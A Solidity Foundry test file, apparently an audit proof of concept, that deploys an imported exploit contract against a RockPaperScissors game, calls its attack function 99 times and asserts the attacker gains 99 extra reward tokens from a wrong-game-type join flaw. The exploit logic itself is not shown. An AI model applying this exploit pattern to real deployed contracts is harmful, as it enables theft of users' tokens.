// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/WinningToken.sol";
import "../src/RockPaperScissors.sol";
import "../src/JoiningWrongGameType.sol";
import "forge-std/Test.sol";

contract JoiningWrongGameTypeTest is Test {
    WinningToken token;
    RockPaperScissors game;

    address attacker = makeAddr("attacker");
    address admin = makeAddr("admin");
    uint256 attackerInitialRPSW = 10;
    uint256 times = 99;

    function setUp() public {
        game = new RockPaperScissors();
        token = game.winningToken();

        vm.prank(address(game));
        token.mint(attacker, attackerInitialRPSW);
        require(token.balanceOf(attacker) >= 1, "Setup failed");
    }

    function test_joiningWrongGameType() public {
        vm.startPrank(attacker);

        JoiningWrongGameType exploitContract = new JoiningWrongGameType(game, token);
        token.transfer(address(exploitContract), 1);
        exploitContract.attack(times);
        assertEq(token.balanceOf(attacker), attackerInitialRPSW + times);

        vm.stopPrank();
    }
}
